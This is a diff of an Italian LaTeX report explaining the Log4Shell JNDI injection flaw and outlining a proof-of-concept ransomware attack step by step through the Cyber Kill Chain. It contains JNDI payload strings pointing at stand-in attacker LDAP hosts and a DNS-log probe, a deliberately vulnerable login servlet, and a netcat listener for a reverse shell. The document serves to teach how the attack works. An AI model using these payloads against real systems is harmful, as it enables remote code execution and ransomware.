@@ -18,20 +18,20 @@
 \definecolor{codegreen}{rgb}{0,0.6,0}
 \definecolor{codegray}{rgb}{0.5,0.5,0.5}
 \definecolor{codepurple}{rgb}{0.68,0,0.12}
-\definecolor{backcolour}{rgb}{0.96,0.96,0.96}
+\definecolor{backcolour}{rgb}{1,1,1}
 
 \usepackage{listings}
 
-\lstloadlanguages{Python}
-\lstdefinestyle{PythonCodeStyle}{
-   	language=Python,
+\lstloadlanguages{Java}
+\lstdefinestyle{JavaCodeStyle}{
+   	language=Java,
    	backgroundcolor=\color{backcolour},
 	basicstyle=\ttfamily\footnotesize,
    	commentstyle=\color{codegray},
    	keywordstyle=\color{codegreen},
    	stringstyle=\color{codepurple},
     numbers=left,
-   	numbersep=-5pt,
+   	numbersep=-7pt,
 	numberstyle=\tiny\color{gray},
 	breakatwhitespace=false,
 	breaklines=true,
@@ -43,7 +43,7 @@
     frame=lines,
 	captionpos=b,
 }
-\lstset{style=PythonCodeStyle}
+\lstset{style=JavaCodeStyle}
 
 \begin{document}
 
@@ -81,17 +81,17 @@ Lo zero-day, inizialmente annunciato con un tweet insieme ad un PoC pubblicato s
 
 
 \subsection{JNDI Injection}
-
 Nel 2013 il team di sviluppo di Log4j ha aggiunto un plugin chiamato \textbf{JNDI-Lookup} alla libreria di logging. Per capire come questa modifica abbia portato alla recente vulnerabilità, è necessario introdurre il concetto di \emph{Java Naming and Directory Interface} (\textbf{JNDI}).
 
-\subsubsection{JNDI}
 
+\subsubsection{JNDI}
 JNDI fornisce un'API Java che consente alle applicazioni di interagire con oggetti remoti memorizzati attraverso servizi di naming e directory.
 Esso dispone di una serie di SPI (\emph{Service Provider Interface}) che permettono di utilizzare una varietà di servizi di directory.
 Tramite questa interfaccia i client Java possono scoprire e ottenere dati e oggetti attraverso un nome. 
 
 JNDI supporta due protocolli principali: RMI e LDAP, in entrambi i casi una chiamata lookup ha lo scopo di restituire un oggetto Java. Questi oggetti sono solitamente serializzati, tuttavia esiste anche un meccanismo di riferimento JNDI per la costruzione indiretta di un oggetto tramite una factory.
 I bytecode di questi oggetti (o delle factory) possono essere caricati tramite l'URL di una codebase remota (cioè un server web contenente file \verb!.class!). Un'applicazione Java può ad esempio utilizzare il protocollo LDAP tramite JNDI per trovare un oggetto remoto contenente i dati di cui potrebbe aver bisogno.
+
 
 \subsubsection{LDAP attack vector}
 \emph{Lightweight Directory Access Protocol} (LDAP) è un protocollo standard per l'interrogazione e la modifica dei servizi di directory.
@@ -109,30 +109,26 @@ Questo significa che un'attaccante che può controllare l'URL JNDI, può far sì
 
 
 \subsubsection{JNDI in Log4j}
-
 Log4Shell è fondamentalmente una vulnerabilità di JNDI Injection abbastanza semplice, triggerata tramite la ricerca JNDI, chiamata JNDI Lookup, implementata nella libreria di logging, che consente di recuperare variabili remote tramite JNDI.
 
 Log4J effettua una JNDI lookup mentre espande i placeholder nei messaggi di log. Quasi tutti gli input dell'utente, prima di essre loggati, vengono interpretati dal logger, questo consente all'attaccante che può manipolare l'input, di caricare dati da un server JNDI dannoso e potenzialmente eseguire codice Java arbitrario.
 Log4j2 supporta la possibilità di specificare dei placeholder nei messaggi di log come riferimenti a proprietà definite altrove. Questo viene effettuato attraverso una sintassi speciale nella forma \verb!${prefisso:nome}!, dove il prefisso identifica un contesto specifico nel quale valutare il nome della variabile.
 Ad esempio loggando la stringa \verb!${java:version}! si ottiene la versione corrente di Java in esecuzione.
 
-
 Tutto ciò che un attaccante deve fare per sfruttare la vulnerabilità è trovare un input che viene registrato nei log ed iniettare una stringa del tipo:
 \begin{center}
-    \verb!${jndi:ldap://attackerserver.com.com/x}!
+    \verb!${jndi:ldap://attackerserver.com/a}!
 \end{center}
 Questo potrebbe essere un'intestazione HTTP come lo User-Agent (comunemente registrato nei log) o un parametro di un form come username o password che viene loggato dalla applicazione.
 
 
 \subsubsection{Patch nelle versioni Java}
-
 Per diverso tempo sia per RMI che per LDAP il riferimento che era possibile specificare relativo alla codebase da importare non è stato affatto limitato, una chiamata lookup ad server LDAP o RMI controllato dall'attaccante portava direttamente all'esecuzione di codice remoto.
 
 A partire dalla versione di Java \verb!8u121! l'inserimento di una codebase remota è stata bloccata di default per quanto riguarda RMI.
 Apparentemente la patch era stata applicata anche per LDAP, ma si è rivelata completamente inefficace per il caricamento di oggetti tramite le codbase di factory. Pertanto, fino al rilascio di Java \verb!8u191! (circa tre anni fa) i riferimenti LDAP consentivano di caricare classi remote contenenti codice arbitrario tramite una chiamata JNDI lookup controllata.
 
 Le versioni JDK successive a \verb!8u191! non sono vulnerabili al vettore di attacco LDAP. In queste versioni \verb!com.sun.jndi.ldap.object.trustURLCodebase! è impostato su \verb!false! per impostazione predefinita, il che significa che JNDI non può caricare codice remoto utilizzando LDAP. Tuttavia, esistono altri vettori di attacco capaci di causare RCE, un attaccante infatti potrebbe comunque sfruttare il codice di altre applicazioni esistenti sul server per ottenere il caricamento di codice remoto. 
-
 
 
 \subsection{Requisiti dell'attacco}
@@ -147,7 +143,6 @@ I requisiti per considerare un sistema una potenziale vittima di questo tipo di 
     
     \item Un'istruzione che effettui il log tramite log4j della stringa ricevuta.
 \end{itemize}
-
 
 
 \subsection{Fasi dell'attacco}
@@ -167,26 +162,144 @@ Un'attacco che sfrutta la vulnerabilità Log4Shell con il vettore LDAP per otten
     \item A questo punto l'applicazione vulnerabile carica il file remoto \verb!Exploit.class!, instanziando l'oggetto Java ed eseguendo il codice del suo costruttore. Tale operazione consente all'attaccante di ottenere i privilegi di esecuzione di codice remoto sull'host.
 \end{enumerate}
 
+\newpage
 
 %% POC %%
-\section{PoC: Attacco Ramsonware tramite Log4Shell}
+\section{PoC: Attacco Ransomware tramite Log4Shell}
+Per mostrare come Log4Shell possa condurre facilmente un avversario ad eseguire codice su una macchina target è stato realizzato un \emph{Proof of Concept} che illustra un tipico attacco ransomware effettuato per mezzo di questa vulnerabilità.
+
+
+\subsection{Macchina vittima}
+La macchina vittima è costituita da una web-app vulnerabile eseguita su un server web Apache Tomcat in ascolto sull porta 8080.
+L'applicazione web è stata sviluppata con la tecnologia JSP ed utilzza Java Servlet per l'elaborazione lato server.
+
+Il software simula una comune applicazione aziendale esposta sul web e in esecuzione su un server interno a cui è possibile accedere tramite un URL (es. www.<app-name>.com:8080).
+La pagina principale mostra una schermata di login nella quale è necessario inserire nome utente e password per effettuare l'accesso alla app.
+Il form di login invia una richiesta HTTP POST contenente le credenziali inserite dall'utente, che viene processata da un Login Servlet. La classe si occupa di validare le credenziali e di memorizzare in un file di log lo username degli utenti che tentano di effettuare l'accesso.
+L'operazione di scrittura del log mediante Log4j permette di triggerare la nota vulnerabilità.
+
+\begin{figure}
+    \centering
+    \begin{lstlisting}
+    import org.apache.logging.log4j.LogManager;
+    import org.apache.logging.log4j.Logger;
+    
+    @WebServlet(name = "loginServlet", value = "/login")
+    public class LoginServlet extends HttpServlet {
+        private static final Logger logger = LogManager.getLogger("LoginServlet");
+    
+        @Override
+        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+            String userName = req.getParameter("uname");
+            String password = req.getParameter("password");
+    
+            resp.setContentType("text/html");
+            PrintWriter out = resp.getWriter();
+            out.println("<html><body>");
+    
+            if (userName.equals("admin") && password.equals("password")) {
+                out.println("Welcome Back Admin");
+            } else {
+                logger.error(userName);
+                out.println("<code> the password you entered was invalid, <u> we will log your information </u> </code>");
+            }
+        }
+    }
+\end{lstlisting}
+    \caption{Login Servlet - Codice Java}
+    \label{fig:loginservlet}
+\end{figure}
+
+
+\subsection{Macchina attaccante}
+La macchina attaccante comprende diversi servizi che vengono eseguiti per interagire con il sistema target. Tra questi si trovano:
+\begin{itemize}
+    \item Un server LDAP malevolo che ascolta le connessioni sulla porta 1389 e restituisce il path ad un oggetto Java contenente il codice dell'attacco.
+    \item Un server web che permette di accedere al bytecode dell'oggetto remoto.
+    \item Un listener netcat in attesa sulla porta 9001 di connessioni TCP da parte della macchina vittima.
+\end{itemize}
+
 
 \subsection{Cyber Kill Chain dell'attacco}
+L'obiettivo principale dell'attaccante è eseguire un malware sulla macchina della vittima con il fine di corrompere i file presenti in memoria e chiedere un riscatto per il ripristino di questi.
+Si descrive ora lo svolgimento dell'attacco mediante il modello Cyber Kill Chain.
+
+
 \subsubsection{Reconnaissance}
+Nella prima fase, l’attaccante interagisce con gli host e con la rete target alla ricerca di un endpoint in ascolto su qualsiasi protocollo che permetta di inviare il payload malevolo (reconnaissance attiva).
+Una volta individuata l'applicazione web sulla porta 8080 alla quale inviare richieste HTTP, è opportuno assicurarsi che questa sia effettivamente vulnerabile a Log4Shell.
+
+Il modo più semplice per rilevare se un endpoint remoto è vulnerabile, consiste nell'attivare una query DNS. 
+Utilizzando un logger DNS online (ad esempio \href{http://dnslog.cn}{dnslog}), è possibile generare generare un nome di dominio ed inserirlo nell'URL JNDI di un payload di prova.
+\begin{center}
+    \verb!${jndi:ldap://fchcia.dnslog.cn/a}!
+\end{center}
+A questo punto è necessario inviare il payload attraverso una richiesta HTTP,  l'exploit farà sì che il server tenti di recuperare dei dati in remoto, permettendo di rilevare una eventuale attivazione della vulnerabilità.
+\`E possibile automatizzare l'operazione attraverso strumenti come i vulnerability scanner reperibili online.
+
+\begin{figure}
+\centering
+\includegraphics[width=1\textwidth]{img/dnslog.png}
+\caption{Query DNS effettuate tramite JNDI}
+\label{fig:dnslog}
+\end{figure}
 
 \subsubsection{Weaponization}
+Questa fase consiste nel creare il malware per cifrare i dati e generare un payload per sfruttare la vulnerabilità identificata.
+A tale scopo sono stati implementati i seguenti file:
+\begin{itemize}
+    \item \verb!Ransomware.java!: contiene il codice del malware che si occupa di cifrare i dati.
+    \item \verb!ReverseShell.java!: contiene il codice per aprire una reverse shell sulla macchina avversaria.
+    \item \verb!exploit.py!: avvia i servizi LDAP e HTTP sul server attaccante e genera il payload malevolo.
+\end{itemize}
 
-\subsubsection{Deliver}
+\subsubsection{Delivery}
+In un attacco che sfrutta Log4j la fase di Delivery non è presente poiché la trasmissione e la seguente esecuzione del malware vengono effettuati durante l'exploit della vulnerabilità legata alla libreria di logging.
+
 
 \subsubsection{Exploitation}
+La fase principale dell'attacco viene attuata sfruttando la vulnerabilità di Log4j per ottenere una RCE. 
+Lo script \verb!exploit.py! presente nel progetto ha lo scopo di:
+\begin{itemize}
+    \item Instanziare un server LDAP malevolo in ascolto sulla porta 1389.
+    \item Compilare la classe Java da eseguire sulla macchina vittima ed hostare il file \verb!.class ! su un server HTTP in ascolto sulla porta 8000.
+    \item Generare il payload malevolo per sfruttare la vulnerabilità, formattato come una stringa del tipo: 
+    \begin{center}
+        \verb!${jndi:ldap://attacker-ldap.com:1389/a}!
+    \end{center}
+\end{itemize}
+
+L'attaccante invia al server web il payload generato inserendolo nel campo \verb!username! del form di login.
+Apache Log4j, al momento di loggare il nome utente, effettua una richiesta JNDI al server LDAP creato, il quale restituisce il path dell'oggetto Java con il codice malevolo.
+A questo punto, l'applicazione vulnerabile carica il file remoto ed esegue il codice del ransomware.
 
 \subsubsection{Installation}
+Questa fase è facoltativa ai fini dello sviluppo dell'attacco ransomware, si è comunque deciso di inserirla nel PoC con il fine di mostrare la numerosità di applicazioni a cui si presta Log4Shell.
+
+L’obiettivo dell'attaccante è quello di mantenere l’accesso alla macchina (persistenza), per fare ciò è possibile creare una \textbf{backdoor shell}.
+Tramite una ulteriore JNDI Injection si esegue il codice remoto di una classe Java che, collegandosi ad un server malevolo dell'attaccante, apre una reverse shell.
+Questo exploit permette di ottenere il totale controllo della macchina vittima e può essere usato come base per lanciare ulteriori attacchi.
+
 
 \subsubsection{Command and Control}
+In questa fase viene stabilito un canale di comunicazione con un server controllato dall’attaccante. 
+Tramite \textbf{netcat} viene avviato un listener in ascolto sulla porta 9001.
+\begin{center}
+    \verb!$ nc -lvnp 9001!
+\end{center}
+In questo modo il sever si mette in attesa di un collegamento da parte della macchina vittima.
+
+Il malware, una volta avviato, si connette al server C2 per inviare, in modo criptato, la chiave simmetrica necessaria per decifrare i file corrotti. Essa verrà inviata alla vittima soltanto dopo il pagamento del riscatto stabilito.
+
 
 \subsubsection{Actions on Objectives}
+Una volta che il sistema target è stato compromesso tramite la cifratura dei file presenti nella macchina e il riscatto viene pagato, l'attaccante consegue l’obiettivo per il quale l’attacco è iniziato.
+
+\newpage
 
 \section{Conclusioni}
+
+\newpage
 
 %% BIBLIOGRAFIA %%
 \addcontentsline{toc}{section}{\bibname}
